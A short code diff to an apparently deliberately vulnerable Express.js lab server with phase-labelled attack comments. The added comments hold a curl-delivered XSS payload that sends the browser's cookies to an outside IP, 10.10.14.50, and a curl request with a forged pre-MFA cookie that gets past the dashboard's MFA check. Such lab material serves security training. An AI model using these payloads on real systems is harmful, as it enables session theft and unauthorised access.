@@ -47,7 +47,11 @@ app.post('/api/feedback', (req, res) => {
     res.send('Feedback received safely.');
 });
 
+// curl -X POST http://localhost:3075/api/feedback -d "payload=<svg onload=\
+// "fetch('http://10.10.14.50/?c='+window['document']['cookie'])\">"
+
 // PHASE 3: INITIAL ACCESS (MFA BYPASS)
+// curl -i -b "pre_mfa_session=pending_mfa_verification" http://localhost:3075/dashboard
 app.get('/dashboard', (req, res) => {
     const cookies = req.cookies || {};
     let isAuthenticated = false;
